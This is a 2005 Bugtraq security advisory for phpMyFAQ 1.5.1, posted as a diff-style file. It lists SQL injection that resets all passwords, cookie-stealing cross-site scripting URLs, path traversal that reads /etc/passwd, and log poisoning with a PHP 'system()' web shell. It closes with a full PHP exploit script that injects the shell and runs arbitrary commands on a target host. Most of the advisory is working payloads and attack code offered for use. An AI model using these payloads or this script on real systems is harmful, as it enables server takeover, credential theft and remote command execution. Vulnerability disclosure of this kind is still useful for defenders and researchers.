@@ -1,0 +1,297 @@
+
+Date: 22 Sep 2005 23:36:30 -0000
+From: retrogod@...ceposta.it
+To: bugtraq@...urityfocus.com
+Subject: PhpMyFAQ 1.5.1 multiple vulnerabilities
+
+
+2.31 23/09/2005
+
+PhpMyFaq 1.5.1 SQL injection / board takeover / user info disclosure / path disclosure
+remote code / commands execution
+
+software:
+site: http://www.phpmyfaq.de/
+description: "phpMyFAQ is a multilingual, completely database-driven FAQ-system.
+It supports various databases to store all data, PHP 4.1.0 (or higher) is needed
+in order to access this data. phpMyFAQ also offers a multi-language Content
+Management-System with a WYSIWYG editor and an Image Manager, flexible multi-user
+support with LDAP support, a news-system, user-tracking, language modules,
+enhanced automatic content negotiation, templates, extensive XML-support,
+PDF-support, a backup-system, a dynamic sitempa and an easy to use installation script."
+
+vulnerabilities:
+
+1) if magic quotes off -> SQL injection:
+   just take a look at vulnerable code in /admin/password.php:
+   ...
+        $username = $_POST["username"];
+        $email = $_POST["email"];
+        $num = $db->num_rows($db->query("SELECT name, email FROM ".SQLPREFIX."faquser WHERE name = '".$username."' AND email = '".$email."'"));
+        if ($num == 1) {
+            $consonants = array("b","c","d","f","g","h","j","k","l","m","n","p","r","s","t","v","w","x","y","z");
+            $vowels = array("a","e","i","o","u");
+            $newPassword = "";
+            srand((double)microtime()*1000000);
+            for ($i = 1; $i <= 4; $i++) {
+                $newPassword .= $consonants[rand(0,19)];
+                $newPassword .= $vowels[rand(0,4)];
+                }
+            $db->query("UPDATE ".SQLPREFIX."faquser SET pass = '".md5($newPassword)."' WHERE name = '".$username."' AND email = '".$email."'");
+            $text = $PMF_LANG["lostpwd_text_1"]."\nUsername: ".$username."\nNew Password: ".$newPassword."\n\n".$PMF_LANG["lostpwd_text_2"];
+            mail($IDN->encode($email), $PMF_CONF["title"].": username / password request", $text, "From: ".$IDN->encode($PMF_CONF["adminmail"]));
+   ...
+
+
+   switch to /admin directory, click on "forgotten password" feature
+   and  without to have an account you can reset
+   admin password and send yourself it by email, example:
+
+   user: ' or isnull(1/0) /*
+   mail: [your_email]
+
+   the two queries become:
+
+   SELECT name, email FROM phpmyfaq_faquser WHERE name = '' or isnull(1/0) /*' AND email = '[your_email]'
+
+   and
+
+   UPDATE phpmyfaq_faquser SET pass = '[password_hash]' WHERE name = '' or isnull(1/0) /*' AND email = '[your_email]'
+
+   (so all accounts have the same new password... not only admin one)
+
+   [your_email] , now is passed to mail() funxtion
+
+   you will soon receive a mail like this:
+
+  "Thank you for requesting your account information.
+   Username: ' or isnull(1/0) /*
+   New Password: relicuxe
+
+   Please set a new personal password in the admin section of your FAQ."
+
+   now you can login, backup database, add/delete news, records, ban ip and execute
+   commands on target system by inserting php code in news, system calls, etc.
+
+2) cross site scripting:
+
+http://[target]/[path]/phpmyfaq/admin/footer.php?PMF_CONF[version]=<script>alert(document.cookie)</script>
+http://[target]/[path]/phpmyfaq/admin/header.php?PMF_LANG[metaLanguage]="><script>alert(document.cookie)</script>
+
+3) arbitrary inclusion (on Windows):
+   if magic_quotes_gpc off in php.ini settings you can see ANY file on target system:
+   http://[target]/[path]/phpmyfaq/index.php?LANGCODE=/../../../../../../etc/passwd%00
+
+4) if magic_quotes both on and off you can include an arbitrary php file
+   on the target machine:
+
+   http://[target]/[path]/phpmyfaq/index.php?LANGCODE=/../../../../[scriptname]
+
+   [scriptname] without '.php' extension
+
+5) user info disclosure:
+
+   http://[target]/[path]/phpmyfaq/data/tracking[date]
+
+   where [date] is today date, example: 22092005
+   you will see the log file...
+
+6) path disclosure:
+   http://[target]/[path]/phpmyfaq/index.php?LANGCODE=[a_non_existent_file]
+
+7) you can insert php code in a User Agent field request packet, example:
+
+   <?php system($HTTP_GET_VARS[cmd]) ?>
+
+   and, if magic_quotes is off, you can include log file to execute shell commands (this on Windows)
+
+   http://[target]/[path]/phpmyfaq/index.php?cmd=ls%20-la&LANGCODE=/../../data/tracking[date]%00
+
+
+this is my proof of concept exploit (it works against Windows servers, so it's only a divertisement
+but OK, we are admin, remember? ;) ...):
+
+<?php
+#   17.34 22/09/2005                                                           #
+#                                                                              #
+#   phpmyfaq_xpl.php                                                           #
+#                                                                              #
+#   PhpMyFaq 1.5.1 ( possibly prior versions) shell inject                     #
+#                                                                              #
+#                                by rgod                                       #
+#                      site: http://rgod.altervista.org                        #
+#                                                                              #
+#   make these changes in your php.ini if you have troubles                    #
+#   to launch this script:                                                     #
+#   allow_call_time_pass_reference = on                                        #
+#   register_globals = on                                                      #
+#                                                                              #
+#   usage: launch this script from Apache, fill requested fields, then         #
+#   if magic_quotes_gpc is off, boom! you launch commands...                   #
+#                                                                              #
+#   Sun-tzu: "When in difficult country, do not encamp. In country where high  #
+#   roads intersect, join hands with your allies. Do not linger in dangerously #
+#   isolated positions. In hemmed-in situations, you must resort to stratagem. #
+#   In desperate position, you must fight."                                    #
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 2);
+ob_implicit_flush (1);
+
+echo'<head> <title> PhpMyFAQ 1.5.1  remote  commands  execution  </title> <meta
+http-equiv="Content-Type"  content="text/html; charset=iso-8859-1"> <style type=
+"text/css"> <!-- body,td,th {color:  #00FF00;} body {background-color: #000000;}
+.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }
+.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;
+font-style: italic; } --> </style></head> <body> <p class="Stile6">     PhpMyFAQ
+V  1.5.1 (possibly prior versions) remote commands execution  </p><p class="Stil
+e6">a script by rgod at <a href="http://rgod.altervista.org"    target="_blank">
+http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%"> <form
+name="form1"      method="post"   action="'.$SERVER[PHP_SELF].'?path=value&host=
+value&port=value&command=value&proxy=value"><p><input type="text"   name="host">
+<span class="Stile5">  hostname  (ex: www.sitename.com)  </span>  </p> <p><input
+type="text" name="path"><span class="Stile5">  path ( ex:  /phpmyfaq/ or just /)
+</span></p><p><input type="text"   name="port" >   <span class="Stile5"> specify
+a port other than 80 (default value)  </span></p><p> <input  type="text"   name=
+"command"> <span  class="Stile5"> a  Unix  command  ,  example:  ls -la  to list
+directories, cat /etc/passwd to show passwd file </span></p><p><input type="text
+" name="proxy"> <span class="Stile5"> send exploit through an HTTP proxy (ip:por
+t</span></p> <p> <input  type="submit"name="Submit" value="go!"></p></form></td>
+</tr></table></body></html>';
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '<table border="0"><tr>';
+while ($ii <= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo "<td>&nbsp;&nbsp;</td>";
+             for ($li=0; $li<=15; $li++)
+                      { echo "<td>".$headeri[$li+$ki]."</td>";
+			    }
+            $ki=$ki+16;
+            echo "</tr><tr>";
+            }
+if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
+{echo "<td>".$datai."</td> ";}
+$ii++;
+$ji++;
+}
+for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo "<td>&nbsp&nbsp</td>";
+                       }
+
+for ($li=$ci*16; $li<=strlen($headeri); $li++)
+                      { echo "<td>".$headeri[$li]."</td>";
+			    }
+echo "</tr></table>";
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket($packet)
+{
+global $proxy, $host, $port, $html;
+if ($proxy=='')
+           {$ock=fsockopen(gethostbyname($host),$port);}
+             else
+           {
+	    if (!eregi($proxy_regex,$proxy))
+	    {echo htmlentities($proxy).' -> not a valid proxy...';
+	     die;
+	    }
+	   $parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+	    $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,1);
+    }
+  }
+fclose($ock);
+echo nl2br(htmlentities($html));
+}
+
+if (($path<>'') and ($host<>'') and ($command<>''))
+{
+  if ($port=='') {$port=80;}
+
+# STEP 1 -> Shell Inject...
+if ($proxy=='')
+{$packet="GET ".$path."index.php?sid=49493&lang=it&action=ask HTTP/1.0 \r\n";}
+else
+{$packet="GET http://".$host.$path."index.php?sid=49493&lang=it&action=ask HTTP/1.0 \r\n";}
+
+$packet.='User-Agent: <?php system($HTTP_GET_VARS[cmd]) ?><?php die ?>'."\r\n";
+//you cannot insert ";" because it is stripped, so insert more statements
+//if you change the shell, keep attemption to php syntax, if you make an error,
+//you cannot lauch commands till tomorrow, I am not joking ;)
+
+$packet.="Accept-Language: pl\r\n";
+$packet.="Referer: http://".$host.$path."\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Accept-Encoding: gzip,deflate\r\n";
+$packet.="Host: ".$host."\r\n\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cookie: lang=it; sid=49493\r\n";
+show($packet);
+sendpacket($packet);
+
+# STEP 2 -> Include the log file and launch commands...
+if ($proxy=='')
+{$packet="GET ".$path."index.php?cmd=".urlencode($command)."&LANGCODE=/../../data/tracking".date("dmY")."%00 HTTP/1.0 \r\n";}
+else
+{$packet="GET http://".$host.$path."index.php?cmd=".urlencode($command)."&LANGCODE=/../../data/tracking".date("dmY")."%00 HTTP/1.0 \r\n";}
+$packet.='User-Agent: Mozilla/5.0 (compatible; Konqueror/3.4; Linux) KHTML/3.4.2 (like Gecko)'."\r\n";
+$packet.="Accept-Language: fr\r\n";
+$packet.="Referer: http://".$host.$path."\r\n";
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
+$packet.="Accept-Encoding: gzip,deflate\r\n";
+$packet.="Host: ".$host."\r\n\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cookie: lang=it; sid=49493\r\n";
+show($packet);
+sendpacket($packet);
+}
+else
+{
+echo '<br>fill in requested fields, optionally specify a proxy...<br><br>';
+}
+?>
+
+rgod
+site: http://rgod.altervista.org
+mail: retrogod at aliceposta it
+original advisory: http://rgod.altervista.org/phpmyfuck151.html
+
+
+
+
+
+
+
